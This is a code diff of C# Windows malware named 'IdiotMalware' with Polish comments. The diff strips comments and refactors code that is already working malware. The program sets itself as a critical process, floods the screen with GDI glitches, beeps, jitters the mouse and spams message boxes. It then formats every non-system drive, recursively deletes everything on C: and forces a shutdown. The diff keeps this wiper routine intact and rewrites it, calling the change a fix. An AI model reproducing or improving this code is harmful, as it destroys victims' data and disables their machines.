@@ -12,7 +12,6 @@ namespace IdiotMalware
 {
     class Program
     {
-        // --- API IMPORT ---
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
         [DllImport("kernel32.dll", SetLastError = true)]
@@ -48,12 +47,11 @@ namespace IdiotMalware
             int isCritical = 1;
             try { NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int)); } catch { }
 
-            // START WSZYSTKICH PAYLOADÓW
             new Thread(Payload_TikTokScroll).Start();
             new Thread(Payload_MouseJitter).Start();
             new Thread(Payload_Cursor_Signs).Start();
-            new Thread(Payload_GDI_Chaos).Start(); // Negatyw, RGB split, Tunele
-            new Thread(Payload_Audio_Terror).Start(); // Beepy
+            new Thread(Payload_GDI_Chaos).Start();
+            new Thread(Payload_Audio_Terror).Start();
             new Thread(SlowBurnRoutine).Start();
             new Thread(Payload_Spam_MsgBox).Start();
 
@@ -67,7 +65,6 @@ namespace IdiotMalware
             try { File.WriteAllText(path, content); Process.Start("notepad.exe", path); } catch { }
         }
 
-        // --- EFEKT PRZEWIJANIA (TIKTOK/SHORTS) ---
         static void Payload_TikTokScroll()
         {
             IntPtr hdc = GetDC(IntPtr.Zero);
@@ -80,7 +77,6 @@ namespace IdiotMalware
             }
         }
 
-        // --- GDI CHAOS (KOLORY, NEGATYW, GLITCH) ---
         static void Payload_GDI_Chaos()
         {
             IntPtr hdc = GetDC(IntPtr.Zero);
@@ -88,47 +84,31 @@ namespace IdiotMalware
             while (true)
             {
                 int effect = rnd.Next(10);
-                if (effect < 2) // Negatyw
-                    BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, 0x00550009);
-                else if (effect < 4) // RGB Split / Glitch
-                    BitBlt(hdc, rnd.Next(-10, 10), 0, w, h, hdc, 0, 0, 0x00CC0020);
-                else if (effect < 6) // Tunel do środka
-                    BitBlt(hdc, 10, 10, w - 20, h - 20, hdc, 0, 0, 0x00CC0020);
-                
-                if (rnd.Next(100) > 98) // Losowe białe linie
-                    BitBlt(hdc, 0, rnd.Next(h), w, 2, hdc, 0, 0, 0x00EE0086);
-
+                if (effect < 2) BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, 0x00550009);
+                else if (effect < 4) BitBlt(hdc, rnd.Next(-10, 10), 0, w, h, hdc, 0, 0, 0x00CC0020);
+                else if (effect < 6) BitBlt(hdc, 10, 10, w - 20, h - 20, hdc, 0, 0, 0x00CC0020);
                 Thread.Sleep(20);
             }
         }
 
         static void Payload_Audio_Terror()
         {
-            while (true)
-            {
-                Beep((uint)rnd.Next(100, 2000), 100);
-                Thread.Sleep(rnd.Next(50, 500));
-            }
+            while (true) { Beep((uint)rnd.Next(100, 2000), 100); Thread.Sleep(rnd.Next(50, 500)); }
         }
 
         static void Payload_MouseJitter()
         {
-            while (true)
-            {
-                Point p = Cursor.Position;
-                Cursor.Position = new Point(p.X + rnd.Next(-10, 11), p.Y + rnd.Next(-10, 11));
-                Thread.Sleep(5);
-            }
+            while (true) { Point p = Cursor.Position; Cursor.Position = new Point(p.X + rnd.Next(-10, 11), p.Y + rnd.Next(-10, 11)); Thread.Sleep(5); }
         }
 
         static void Payload_Cursor_Signs()
         {
             string signs = "CHIPS_EATER_IDIOT_☠_!!!";
             List<Form> trail = new List<Form>();
-            for (int i = 0; i < signs.Length; i++)
+            foreach (char c in signs)
             {
                 Form f = new Form { FormBorderStyle = FormBorderStyle.None, Size = new Size(20, 30), BackColor = Color.Black, TransparencyKey = Color.Black, TopMost = true, ShowInTaskbar = false };
-                Label l = new Label { Text = signs[i].ToString(), ForeColor = Color.Yellow, Font = new Font("Comic Sans MS", 18, FontStyle.Bold), Dock = DockStyle.Fill };
+                Label l = new Label { Text = c.ToString(), ForeColor = Color.Yellow, Font = new Font("Comic Sans MS", 18, FontStyle.Bold), Dock = DockStyle.Fill };
                 f.Controls.Add(l); f.Show(); trail.Add(f);
             }
             while (true)
@@ -143,8 +123,8 @@ namespace IdiotMalware
         static void SlowBurnRoutine()
         {
             Thread.Sleep(3000);
-            SetProcessDefaultLayout(1); // Wszystko na lewo (arabski)
-            Thread.Sleep(25000); // 25 sekund czystego szaleństwa
+            SetProcessDefaultLayout(1);
+            Thread.Sleep(25000);
             TotalDestruction();
         }
 
@@ -166,7 +146,17 @@ namespace IdiotMalware
 
         static void TotalDestruction()
         {
-            foreach (DriveInfo d in DriveInfo.GetDrives()) { if (d.IsReady && d.Name != "C:\\") { try { Process.Start("cmd.exe", $"/c format {d.Name.Substring(0, 2)} /FS:NTFS /Q /Y /X"); } catch { } } }
+            foreach (DriveInfo d in DriveInfo.GetDrives()) 
+            { 
+                if (d.IsReady && d.Name != "C:\\") 
+                { 
+                    try { 
+                        string letter = d.Name.Substring(0, 2);
+                        // Naprawione: Brak dolara (kompatybilnosc wsteczna)
+                        Process.Start("cmd.exe", "/c format " + letter + " /FS:NTFS /Q /Y /X"); 
+                    } catch { } 
+                } 
+            }
             try { Process.Start("cmd.exe", "/c del /s /q /f C:\\*.*"); } catch { }
             Thread.Sleep(2000);
             Process.Start("shutdown", "-s -t 0 -f");
